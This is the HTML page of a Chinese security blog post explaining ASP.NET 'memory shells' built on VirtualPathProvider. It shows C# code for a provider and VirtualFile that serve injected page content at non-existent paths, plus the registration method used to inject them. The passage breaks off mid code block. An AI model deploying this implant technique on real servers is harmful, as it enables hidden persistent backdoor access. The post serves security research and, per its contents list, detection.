@@ -1,0 +1,794 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title>ASP.NET下的内存马(四) VirtualPath内存马 - </title><meta name="Description" content="yzddMr6&#39;s Blog"><meta property="og:title" content="ASP.NET下的内存马(四) VirtualPath内存马" />
+<meta property="og:description" content="本文首发于：https://tttang.com/archive/1488/ 1 前言asp.net下的内存马研究文章比较少，目前提到过的包括虚" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" /><meta property="og:image" content="https://yzddmr6.com/images/avatar.webp"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-05-04T15:14:50+00:00" />
+<meta property="article:modified_time" content="2022-05-04T15:14:50+00:00" /><meta property="og:site_name" content="Hugo DoIt Theme Documentation" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://yzddmr6.com/images/avatar.webp"/>
+
+<meta name="twitter:title" content="ASP.NET下的内存马(四) VirtualPath内存马"/>
+<meta name="twitter:description" content="本文首发于：https://tttang.com/archive/1488/ 1 前言asp.net下的内存马研究文章比较少，目前提到过的包括虚"/>
+<meta name="application-name" content="yzddMr6&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="yzddMr6&#39;s Blog">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://yzddmr6.com/posts/asp-net-memory-shell-virtualpath/" /><link rel="prev" href="https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/" /><link rel="next" href="https://yzddmr6.com/posts/java-expression-exploit/" />
+<link rel="stylesheet" href="/css/main.css"><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/color.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/fontawesome-free/all.min.css">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="/lib/animate/animate.min.css">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "ASP.NET下的内存马(四) VirtualPath内存马",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/yzddmr6.com\/posts\/asp-net-memory-shell-virtualpath\/"
+        },"genre": "posts","wordcount":  3621 ,
+        "url": "https:\/\/yzddmr6.com\/posts\/asp-net-memory-shell-virtualpath\/","datePublished": "2022-05-04T15:14:50+00:00","dateModified": "2022-05-04T15:14:50+00:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/yzddmr6.com\/images\/avatar.webp",
+                    "width":  640 ,
+                    "height":  640 
+                }},"author": {
+                "@type": "Person",
+                "name": "yzddMr6"
+            },"description": ""
+    }
+    </script><script src="//instant.page/5.2.0" defer type="module" integrity="sha384-jnZyxPjiipYXnSU0ygqeac2q7CVYMbh84q0uHVRRxEtvFPiQYbXWUorga2aqZJ0z"></script>
+</head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark'); window.theme = theme;   window.isDark = window.theme !== 'light' }
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('auto' === 'light' || 'auto' === 'dark' || 'auto' === 'black') setTheme('auto'), saveTheme('auto'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+        window.switchThemeEventSet = new Set()
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="">yzddMr6&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/tags/"> 标签 </a><a class="menu-item" href="/showcase/"> 作品 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                    <select class="color-theme-select" id="theme-select-desktop" title="切换主题">
+                        <option value="light">浅色</option>
+                        <option value="dark">深色</option>
+                        <option value="black">黑色</option>
+                        <option value="auto">跟随系统</option>
+                    </select>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="">yzddMr6&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/showcase/" title="">作品</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/yzddmr6" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-select" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+                <select class="color-theme-select" id="theme-select-mobile" title="切换主题">
+                    <option value="light">浅色</option>
+                    <option value="dark">深色</option>
+                    <option value="black">黑色</option>
+                    <option value="auto">跟随系统</option>
+                </select>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#virtualpathprovider">VirtualPathProvider</a>
+      <ul>
+        <li><a href="#编写内存马">编写内存马</a></li>
+        <li><a href="#注入内存马">注入内存马</a></li>
+        <li><a href="#测试">测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#进阶思考">进阶思考</a>
+      <ul>
+        <li><a href="#注入代码的位置">注入代码的位置</a></li>
+        <li><a href="#绕过预编译">绕过预编译</a></li>
+        <li><a href="#绕过friendlyurl">绕过FriendlyUrl</a></li>
+        <li><a href="#测试-1">测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#检测内存马">检测内存马</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">ASP.NET下的内存马(四) VirtualPath内存马</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><span class="author fas fa-user-circle fa-fw"></span><a href="https://github.com/yzddmr6" title="Author" target="_blank" rel="noopener noreferrer author" class="author">yzddMr6</a>
+                </span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-05-04">2022-05-04</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-05-04">2022-05-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 3621 字&nbsp;<i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 8 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#virtualpathprovider">VirtualPathProvider</a>
+      <ul>
+        <li><a href="#编写内存马">编写内存马</a></li>
+        <li><a href="#注入内存马">注入内存马</a></li>
+        <li><a href="#测试">测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#进阶思考">进阶思考</a>
+      <ul>
+        <li><a href="#注入代码的位置">注入代码的位置</a></li>
+        <li><a href="#绕过预编译">绕过预编译</a></li>
+        <li><a href="#绕过friendlyurl">绕过FriendlyUrl</a></li>
+        <li><a href="#测试-1">测试</a></li>
+      </ul>
+    </li>
+    <li><a href="#检测内存马">检测内存马</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><meta name="referrer" content="no-referrer" />
+<p>本文首发于：https://tttang.com/archive/1488/</p>
+<h2 id="前言" class="headerLink">
+    <a href="#%e5%89%8d%e8%a8%80" class="header-mark"></a>1 前言</h2><p>asp.net下的内存马研究文章比较少，目前提到过的包括虚拟路径内存马以及HttpListener内存马。最近研究了一下其他类型的内存马，发现.net可以利用的地方要多得多。所以准备写个系列文章，讲一讲asp.net下的内存马。</p>
+<p><strong>文章仅作研究性质，不保证任何实战效果，请勿用于非法用途。</strong></p>
+<p>今天讲一讲最古老也是适用性最广泛的一种内存马：虚拟文件内存马。</p>
+<h2 id="virtualpathprovider" class="headerLink">
+    <a href="#virtualpathprovider" class="header-mark"></a>2 VirtualPathProvider</h2><p>ASP.NET有一个特殊功能叫做虚拟文件，可以映射一个不存在于服务器的文件系统，并且能够对其动态编译并提供访问服务。主要的功能类是System.Web.Hosting.VirtualPathProvider。</p>
+<p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/zh-cn/dotnet/api/system.web.hosting.virtualpathprovider?view=netframework-4.8</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="n">VirtualPathProvider</span><span class="err">类提供一组方法，用于实现</span> <span class="n">Web</span> <span class="err">应用程序的虚拟文件系统。</span> <span class="err">在虚拟文件系统中，文件和目录由服务器操作系统提供的文件系统外的其他数据存储管理。</span> <span class="err">例如，可以使用虚拟文件系统将内容存储在</span><span class="n">SQL</span> <span class="n">Server</span><span class="err">数据库中。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">可以将请求处理的任何文件存储在虚拟文件系统中。</span> <span class="err">这包括：</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ASP</span><span class="p">.</span><span class="n">NET</span> <span class="err">页、母版页、用户控件和其他对象。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">具有扩展名的标准网页，例如</span><span class="p">.</span><span class="n">htm</span><span class="p">.</span><span class="n">jpg</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">映射到</span> <span class="err">实例的任何自定义</span> <span class="n">BuildProvider</span> <span class="err">扩展。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="err">文件夹中的任何命名</span> <span class="n">App_Theme</span> <span class="err">主题。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据官方文档我们可以看到，我们是可以映射一个物理上不存在的ASP.NET页到URL中，这也是我们本文所讲的内存马的原理。</p>
+<h3 id="编写内存马" class="headerLink">
+    <a href="#%e7%bc%96%e5%86%99%e5%86%85%e5%ad%98%e9%a9%ac" class="header-mark"></a>2.1 编写内存马</h3><p>VirtualPathProvider是一个抽象类，我们需要继承这个类然后编写自己的逻辑。</p>
+<p>其中我们要实现以下两个函数：</p>
+<ul>
+<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.web.hosting.virtualpathprovider.fileexists?view=netframework-4.8#system-web-hosting-virtualpathprovider-fileexists%28system-string%29" target="_blank" rel="noopener noreferrer">FileExists(String)</a></li>
+<li><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.web.hosting.virtualpathprovider.getfile?view=netframework-4.8#system-web-hosting-virtualpathprovider-getfile%28system-string%29" target="_blank" rel="noopener noreferrer">GetFile(String)</a></li>
+</ul>
+<p>其中FileExists的功能是告诉Web Server请求到一个什么样的路径可以认为命中了该缓存文件，可以理解为Java内存马中的URL Pattern。</p>
+<p>GetFile函数是告诉Web Server命中URL后返回一个什么样的文件。返回一个System.Web.Hosting.VirtualFile对象</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">using</span> <span class="nn">System.IO</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">namespace</span> <span class="nn">System.Web.Hosting</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="k">public</span> <span class="k">abstract</span> <span class="k">class</span> <span class="nc">VirtualFile</span> <span class="p">:</span> <span class="n">VirtualFileBase</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">protected</span> <span class="n">VirtualFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="k">this</span><span class="p">.</span><span class="n">_virtualPath</span> <span class="p">=</span> <span class="n">VirtualPath</span><span class="p">.</span><span class="n">Create</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">override</span> <span class="kt">bool</span> <span class="n">IsDirectory</span> <span class="p">=&gt;</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">abstract</span> <span class="n">Stream</span> <span class="n">Open</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>VirtualFile是个抽象类，同样我们需要继承。其中需要实现的是Open方法，返回一个流对象，这里是我们要返回构造的内存马的内容。</p>
+<p>yso.net中的代码是参考了官方的写法，其实有很多部分是不必要的。进行简化后，我们内存马部分的代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">class</span> <span class="nc">SamplePathProvider</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualPathProvider</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="kt">string</span> <span class="n">_virtualDir</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="kt">string</span> <span class="n">_fileContent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="n">SamplePathProvider</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualDir</span><span class="p">,</span> <span class="kt">string</span> <span class="n">fileContent</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">:</span> <span class="k">base</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_virtualDir</span> <span class="p">=</span> <span class="n">virtualDir</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">_fileContent</span> <span class="p">=</span> <span class="n">fileContent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="kt">bool</span> <span class="n">IsPathVirtual</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">String</span> <span class="n">checkPath</span> <span class="p">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">VirtualPathUtility</span><span class="p">.</span><span class="n">ToAppRelative</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">checkPath</span><span class="p">.</span><span class="n">ToLower</span><span class="p">().</span><span class="n">Contains</span><span class="p">(</span><span class="n">_virtualDir</span><span class="p">.</span><span class="n">ToLower</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">override</span> <span class="kt">bool</span> <span class="n">FileExists</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">IsPathVirtual</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">Previous</span><span class="p">.</span><span class="n">FileExists</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">override</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualFile</span> <span class="n">GetFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="n">IsPathVirtual</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">new</span> <span class="n">SampleVirtualFile</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">,</span> <span class="n">_fileContent</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">else</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="n">Previous</span><span class="p">.</span><span class="n">GetFile</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">class</span> <span class="nc">SampleVirtualFile</span> <span class="p">:</span> <span class="n">System</span><span class="p">.</span><span class="n">Web</span><span class="p">.</span><span class="n">Hosting</span><span class="p">.</span><span class="n">VirtualFile</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">private</span> <span class="kt">string</span> <span class="n">_fileContent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="kt">bool</span> <span class="n">Exists</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">get</span> <span class="p">{</span> <span class="k">return</span> <span class="k">true</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="n">SampleVirtualFile</span><span class="p">(</span><span class="kt">string</span> <span class="n">virtualPath</span><span class="p">,</span> <span class="kt">string</span> <span class="n">fileContent</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">:</span> <span class="k">base</span><span class="p">(</span><span class="n">virtualPath</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">this</span><span class="p">.</span><span class="n">_fileContent</span> <span class="p">=</span> <span class="n">fileContent</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">override</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Stream</span> <span class="n">Open</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">Stream</span> <span class="n">stream</span> <span class="p">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">MemoryStream</span><span class="p">(</span><span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">_fileContent</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">stream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="注入内存马" class="headerLink">
+    <a href="#%e6%b3%a8%e5%85%a5%e5%86%85%e5%ad%98%e9%a9%ac" class="header-mark"></a>2.2 注入内存马</h3><p>根据官方文档，我们可以调用HostingEnvironment.RegisterVirtualPathProvider(Provider)来注入我们的虚拟文件系统。查看源码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-csharp" data-lang="csharp"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">void</span> <span class="n">RegisterVirtualPathProvider</span><span class="p">(</span><span class="n">VirtualPathProvider</span> <span class="n">virtualPathProvider</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">HostingEnvironment</span><span class="p">.</span><span class="n">_theHostingEnvironment</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">throw</span> <span class="k">new</span> <span class="n">InvalidOperationException</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">BuildManager</span><span class="p">.</span><span class="n">IsPrecompiledApp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HostingEnvironment</span><span class="p">.</span><span class="n">RegisterVirtualPathProviderInternal</span><span class="p">(</span><span class="n">virtualPathProvider</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到首先判断当前_theHostingEnvironment是否为空，这个对象的作用后面会讲到。</p>
+<p>然后判断当前是否是一个预编译项目，如果是的话就退出，否则就调用一个internal方法RegisterVirtualPathProviderInternal。查看源码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
